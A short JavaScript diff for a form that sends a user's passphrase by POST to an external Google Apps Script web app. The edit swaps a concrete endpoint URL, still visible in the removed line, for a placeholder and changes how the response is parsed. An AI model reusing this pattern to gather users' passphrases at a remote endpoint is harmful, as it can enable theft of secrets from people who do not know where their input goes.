@@ -11,7 +11,7 @@ document.getElementById('passphraseForm').addEventListener('submit', function(ev
 });
 
 function savePassphrase(passphrase) {
-    const url = 'https://script.google.com/macros/s/AKfycbzi1bBCjq9P5eC8bcsrmly9ropxLx0q7J2-elHTXy-O7yW5P2bj5S4AwvSY_4OXEFmiPg/exec'; // Replace with your Web app URL
+    const url = 'YOUR_GOOGLE_APPS_SCRIPT_URL'; // Replace with your Web app URL
 
     fetch(url, {
         method: 'POST',
@@ -20,9 +20,9 @@ function savePassphrase(passphrase) {
         },
         body: JSON.stringify({ passphrase: passphrase }),
     })
-    .then(response => response.text())
+    .then(response => response.json()) // Parse JSON response
     .then(data => {
-        console.log('Passphrase saved successfully:', data);
+        console.log('Passphrase saved successfully:', data.result);
     })
     .catch(error => {
         console.error('Error saving passphrase:', error);
